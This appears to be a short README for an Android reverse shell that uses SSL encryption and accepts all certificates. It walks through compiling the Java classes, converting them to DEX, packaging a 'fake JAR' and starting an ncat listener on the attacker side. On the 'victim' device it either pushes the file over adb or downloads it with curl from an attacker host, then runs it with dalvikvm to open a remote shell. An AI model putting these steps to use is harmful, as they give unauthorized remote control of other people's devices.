## Android Reverse Java Shell using SSL Encryption

## On Attacker machine - Linux for example -
### (you need android sdk installed and build-tools also) 

#### Compile Java source code in bytecode (if fails for "class error not supported", change the release!)
`javac --release 17 Shell.java TrustAllCertificates.java`

#### Convert to DEX format 
`~/Library/Android/sdk/build-tools/33.0.0/d8 Shell.class TrustAllCertificates.class`

#### Create fake JAR file
`zip reverse_ssl.jar classes.dex`

#### Set Listener (USE NCAT!)
`ncat -nlvp 1337`

## On victim Android device:
`adb push reverse_ssl.jar /sdcard` (if Android Debug Tools is enabled)

or you can just use dalvikvm from Termux:

`curl http://attackingmachine:9999/reverse_ssl.jar -o /sdcard/reverse_ssl.jar`<br/>
`cd /system/bin/ && ./dalvikvm -cp /sdcard/reverse_ssl.jar Shell`

("Shell" this class name must be the same used before, otherwise it fails!)

You can of course create a pure .apk package and sign it using Android Studio or apktool and apksigner.

## Credits

Inspired from: https://gist.github.com/FrankSpierings/e330e3aea3152f816c202b883887dd60
